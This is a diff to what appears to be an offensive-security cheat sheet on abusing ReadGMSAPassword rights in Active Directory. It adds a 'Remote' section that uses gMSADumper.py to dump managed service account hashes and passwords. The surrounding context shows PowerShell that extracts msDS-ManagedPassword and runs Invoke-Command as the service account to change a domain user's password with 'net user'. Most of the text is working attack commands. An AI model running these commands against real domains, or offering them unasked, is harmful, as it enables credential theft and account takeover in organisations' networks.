@@ -5,6 +5,8 @@ If the user you have owned has ReadGMSAPassword permissions over a GMSA you are 
 
 <img src="https://raw.githubusercontent.com/glowbase/group-managed-service-accounts/main/20220809203905465.png" width="500px" />
 
+## Local
+
 ```powershell
 $gmsa = Get-ADServiceAccount -Identity 'GMSA-USER' -Properties 'msDS-ManagedPassword'
 $mp = $gmsa.'msDS-ManagedPassword'
@@ -23,6 +25,14 @@ Execute commands via `Invoke-Command` as GMSA.
 
 ```powershell
 Invoke-Command -ComputerName COMPUTER_NAME -Credential $cred -ScriptBlock {net user someuser password123! /domain}
+```
+
+## Remote
+
+You can use [gMSADumper.py](https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py) to remotely dump hashes/passwords.
+
+```bash
+python3 gMSADumper.py -u USERNAME -p PASSWORD -l DOMAIN.LOCAL -d DOMAIN.LOCAL
 ```
 
 ## Additional Resources
